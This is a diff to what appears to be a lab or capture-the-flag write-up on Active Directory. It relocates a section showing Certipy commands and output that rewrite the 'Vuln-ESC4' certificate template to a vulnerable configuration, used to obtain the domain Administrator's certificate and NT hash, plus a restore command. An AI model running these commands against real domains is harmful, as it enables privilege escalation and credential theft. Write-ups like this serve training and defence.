@@ -830,6 +830,44 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 ---
 
+## Alternative: Certipy Template Modification
+
+After further research, I discovered that Certipy v5 supports the `-write-default-configuration` flag for the `template` subcommand. This replaces the template's configuration with a default vulnerable one in a single command, eliminating the need for the manual LDAP script above:
+
+```
+Exegol > certipy template -dc-ip 10.1.152.151 -u svc.services -p '[REDACTED]' -template Vuln-ESC4 -target DC-404.404finance.local -write-default-configuration
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Saving current configuration to 'Vuln-ESC4.json'
+[*] Wrote current configuration for 'Vuln-ESC4' to 'Vuln-ESC4.json'
+[*] Updating certificate template 'Vuln-ESC4'
+[*] Replacing:
+[*]     nTSecurityDescriptor: ...
+[*]     flags: 66104
+[*]     pKIDefaultKeySpec: 2
+[*]     pKIKeyUsage: b'\x86\x00'
+[*]     pKIMaxIssuingDepth: -1
+[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
+[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
+[*]     pKIOverlapPeriod: b'\x00\x80\xa6\n\xff\xde\xff\xff'
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
+[*]     msPKI-Enrollment-Flag: 0
+[*]     msPKI-Private-Key-Flag: 16
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+Are you sure you want to apply these changes to 'Vuln-ESC4'? (y/N): y
+[*] Successfully updated 'Vuln-ESC4'.
+```
+
+This approach automatically saves the original configuration to `Vuln-ESC4.json` for later restoration, overwrites the template with a permissive default configuration (removing manager approval, signature requirements, and restrictive ACLs), and enables Client Authentication EKU. After the modification, the standard `certipy req` and `certipy auth` commands work as documented above to obtain the Administrator certificate and NT hash.
+
+To restore the template after exploitation:
+
+```bash
+certipy template -dc-ip 10.1.152.151 -u svc.services -p '[REDACTED]' -template Vuln-ESC4 -target DC-404.404finance.local -configuration Vuln-ESC4.json
+```
+
+---
+
 ## Attack Chain Summary
 
 ```
@@ -906,44 +944,6 @@ Administrator        : [NT HASH]           → Certificate abuse via Vuln-ESC4
 - **username-anarchy** - Username permutation generator
 - **Kerbrute** - Kerberos user enumeration
 - **ldap3** - Python LDAP library for certificate template modification
-
----
-
-## Alternative: Certipy Template Modification
-
-After further research, I discovered that Certipy v5 supports the `-write-default-configuration` flag for the `template` subcommand. This replaces the template's configuration with a default vulnerable one in a single command, eliminating the need for the manual LDAP script above:
-
-```
-Exegol > certipy template -dc-ip 10.1.152.151 -u svc.services -p '[REDACTED]' -template Vuln-ESC4 -target DC-404.404finance.local -write-default-configuration
-Certipy v5.0.4 - by Oliver Lyak (ly4k)
-
-[*] Saving current configuration to 'Vuln-ESC4.json'
-[*] Wrote current configuration for 'Vuln-ESC4' to 'Vuln-ESC4.json'
-[*] Updating certificate template 'Vuln-ESC4'
-[*] Replacing:
-[*]     nTSecurityDescriptor: ...
-[*]     flags: 66104
-[*]     pKIDefaultKeySpec: 2
-[*]     pKIKeyUsage: b'\x86\x00'
-[*]     pKIMaxIssuingDepth: -1
-[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
-[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
-[*]     pKIOverlapPeriod: b'\x00\x80\xa6\n\xff\xde\xff\xff'
-[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
-[*]     msPKI-Enrollment-Flag: 0
-[*]     msPKI-Private-Key-Flag: 16
-[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
-Are you sure you want to apply these changes to 'Vuln-ESC4'? (y/N): y
-[*] Successfully updated 'Vuln-ESC4'.
-```
-
-This approach automatically saves the original configuration to `Vuln-ESC4.json` for later restoration, overwrites the template with a permissive default configuration (removing manager approval, signature requirements, and restrictive ACLs), and enables Client Authentication EKU. After the modification, the standard `certipy req` and `certipy auth` commands work as documented above to obtain the Administrator certificate and NT hash.
-
-To restore the template after exploitation:
-
-```bash
-certipy template -dc-ip 10.1.152.151 -u svc.services -p '[REDACTED]' -template Vuln-ESC4 -target DC-404.404finance.local -configuration Vuln-ESC4.json
-```
 
 ---
 
